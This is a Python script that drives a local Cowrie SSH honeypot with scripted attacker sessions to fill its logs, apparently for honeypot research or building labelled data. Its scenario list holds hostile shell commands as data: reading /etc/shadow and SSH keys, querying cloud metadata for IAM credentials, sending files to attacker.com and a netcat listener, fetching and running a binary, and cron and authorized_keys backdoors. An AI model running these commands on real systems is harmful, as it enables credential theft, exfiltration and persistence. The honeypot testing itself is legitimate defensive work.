"""Drive Cowrie SSH honeypot with realistic attacker traffic to populate logs.

Connects to Cowrie (port 2223 by default — mapped from host via docker-compose),
runs the B6.5 GT scenario commands plus variations, repeats across multiple
sessions/usernames, and lets Cowrie emit its JSON log.

Output: writes to data/cowrie_logs/cowrie.json (Cowrie's native format).
"""

from __future__ import annotations

import argparse
import logging
import random
import sys
import time
from pathlib import Path

import paramiko

logger = logging.getLogger(__name__)

SCENARIOS: list[dict[str, list[str]]] = [
    {
        "name": "novice-recon",
        "commands": [
            "whoami",
            "id",
            "uname -a",
            "cat /etc/passwd",
            "ls -la /tmp",
            "ps aux",
        ],
    },
    {
        "name": "credential-hunt",
        "commands": [
            "cat /etc/shadow",
            "find / -name '*.conf' 2>/dev/null",
            "grep -r password /etc/ 2>/dev/null",
            "cat /home/*/.ssh/id_rsa",
            "ls -la /root/.ssh/",
        ],
    },
    {
        "name": "privilege-escalation",
        "commands": [
            "sudo -l",
            "find / -perm -4000 2>/dev/null",
            "cat /etc/sudoers",
            "python3 -c 'import os; os.setuid(0)'",
        ],
    },
    {
        "name": "network-discovery",
        "commands": [
            "ifconfig",
            "ip a",
            "netstat -an",
            "ss -tulnp",
            "nmap -sV 10.0.0.0/24",
        ],
    },
    {
        "name": "cloud-imds",
        "commands": [
            "curl http://169.254.169.254/latest/meta-data/",
            "wget http://169.254.169.254/latest/user-data",
            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ],
    },
    {
        "name": "lateral-movement",
        "commands": [
            "ssh root@10.0.0.5",
            "scp /etc/passwd user@10.0.0.10:/tmp/",
            "ssh-keyscan 10.0.0.20",
        ],
    },
    {
        "name": "exfiltration",
        "commands": [
            "tar czf - /home/ | nc 10.0.0.100 4444",
            "base64 /etc/shadow | curl -d @- http://attacker.com/exfil",
            "wget http://attacker.com/shell.elf -O /tmp/s",
            "chmod +x /tmp/s && /tmp/s",
        ],
    },
    {
        "name": "persistence",
        "commands": [
            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
            "crontab -l",
            "(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -",
            "systemctl enable backdoor.service",
        ],
    },
]


USERNAMES = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres", "git"]
PASSWORDS = [
    "",
    "admin",
    "123456",
    "password",
    "root",
    "toor",
    "letmein",
    "P@ssw0rd",
    "test",
    "qwerty",
]


def _try_login(
    client: paramiko.SSHClient,
    host: str,
    port: int,
    username: str,
    password: str,
    timeout: float,
) -> bool:
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=timeout,
            auth_timeout=timeout,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"  [warn] connect failed: {e}", file=sys.stderr)
        return False


def _run_commands(client: paramiko.SSHClient, commands: list[str], pause: float) -> int:
    ran = 0
    for cmd in commands:
        try:
            stdin, stdout, stderr = client.exec_command(cmd, timeout=4)
            time.sleep(pause)
            stdout.read(64)  # drain a few bytes so Cowrie registers the output
            ran += 1
        except Exception:
            # Cowrie may hang up on certain commands; that's fine, we still
            # get credit for the attempt if exec_command was accepted.
            ran += 1
    return ran


def drive_cowrie(
    host: str,
    port: int,
    target_sessions: int,
    command_pause: float,
    output_dir: Path,
) -> dict:
    output_dir.mkdir(parents=True, exist_ok=True)
    stats = {"sessions": 0, "auth_attempts": 0, "commands_sent": 0, "logins_ok": 0}
    rng = random.Random(42)

    for i in range(target_sessions):
        scenario = SCENARIOS[i % len(SCENARIOS)]
        # Ponytail: Cowrie default accepts ANY password for these usernames;
        # use them exclusively to maximize successful logins + command volume.
        username = rng.choice(["admin", "test", "root"])
        password = rng.choice(PASSWORDS)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            stats["auth_attempts"] += 1
            logged_in = _try_login(client, host, port, username, password, timeout=6.0)
            if logged_in:
                stats["logins_ok"] += 1
                stats["commands_sent"] += _run_commands(client, scenario["commands"], pause=command_pause)
            stats["sessions"] += 1
        finally:
            try:
                client.close()
            except Exception as e:
                logger.debug("Error closing SSH client: %s", e)
        time.sleep(0.3)

    return stats


def main() -> None:
    parser = argparse.ArgumentParser(description="Drive Cowrie SSH honeypot with attacker traffic")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2223)
    parser.add_argument("--sessions", type=int, default=60)
    parser.add_argument("--pause", type=float, default=0.4)
    parser.add_argument("--output-dir", default="data/cowrie_logs")
    args = parser.parse_args()

    out = Path(args.output_dir)
    print(f"[1/2] Driving Cowrie @ {args.host}:{args.port} with {args.sessions} sessions...")
    stats = drive_cowrie(
        host=args.host,
        port=args.port,
        target_sessions=args.sessions,
        command_pause=args.pause,
        output_dir=out,
    )
    print(
        f"  sessions={stats['sessions']} auth_attempts={stats['auth_attempts']} "
        f"logins_ok={stats['logins_ok']} commands_sent={stats['commands_sent']}"
    )

    log_path = out / "cowrie.json"
    print(f"\n[2/2] Cowrie JSON log expected at: {log_path}")
    if not log_path.exists():
        candidates = sorted(out.glob("*.json"))
        if candidates:
            print(f"  Note: found {len(candidates)} JSON file(s):")
            for c in candidates:
                print(f"    {c} ({c.stat().st_size} bytes)")
        else:
            print("  WARNING: no JSON log found. Did you mount /cowrie/var/log/cowrie?")


if __name__ == "__main__":
    main()
